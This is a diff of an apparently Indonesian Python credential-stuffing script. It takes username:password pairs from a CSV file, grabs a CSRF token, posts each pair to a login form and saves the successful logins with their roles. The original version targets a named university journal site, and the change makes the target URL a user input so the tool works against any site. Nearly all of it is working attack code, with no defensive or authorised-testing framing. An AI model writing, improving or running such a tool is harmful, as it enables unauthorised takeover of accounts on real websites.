@@ -2,17 +2,25 @@ import requests
 import csv
 import re
 
-# URL
-login_page = "https://jurnal.ugp.ac.id/index.php/index/login"
-login_post = "https://jurnal.ugp.ac.id/index.php/index/login/signIn"
+# warna terminal
+GREEN = "\033[92m"
+RED = "\033[91m"
+RESET = "\033[0m"
+
+# input dari user
+login_page = input(">> masukan link login  : ").strip()
+login_post = input(">> masukan link post   : ").strip()
 
 session = requests.Session()
 
 def get_csrf():
-    r = session.get(login_page)
-    match = re.search(r'name="csrfToken" value="(.*?)"', r.text)
-    if match:
-        return match.group(1)
+    try:
+        r = session.get(login_page)
+        match = re.search(r'name="csrfToken" value="(.*?)"', r.text)
+        if match:
+            return match.group(1)
+    except Exception as e:
+        print(RED + f"[!] Error ambil CSRF: {e}" + RESET)
     return None
 
 def detect_role(response_text):
@@ -53,7 +61,7 @@ with open("list.csv", newline='') as file:
         csrf = get_csrf()
 
         if not csrf:
-            print("[!] Gagal ambil CSRF token")
+            print(RED + "[!] Gagal ambil CSRF token" + RESET)
             break
 
         data = {
@@ -67,18 +75,20 @@ with open("list.csv", newline='') as file:
             "Referer": login_page
         }
 
-        r = session.post(login_post, data=data, headers=headers)
+        try:
+            r = session.post(login_post, data=data, headers=headers, timeout=10)
 
-        # cek login sukses (redirect keluar dari halaman login)
-        if "login" not in r.url.lower():
-            role = detect_role(r.text)
+            if "login" not in r.url.lower():
+                role = detect_role(r.text)
 
-            result = f"[✔] SUCCESS: {username}:{password} | ROLE: {role}"
-            print(result)
+                result = f"[✔] SUCCESS: {username}:{password} | ROLE: {role}"
+                print(GREEN + result + RESET)
 
-            success_file.write(f"{username}:{password} | {role}\n")
+                success_file.write(f"{username}:{password} | {role}\n")
+            else:
+                print(RED + f"[✘] FAILED : {username}:{password}" + RESET)
 
-        else:
-            print(f"[✘] FAILED : {username}:{password}")
+        except Exception as e:
+            print(RED + f"[!] ERROR: {e}" + RESET)
 
 success_file.close()
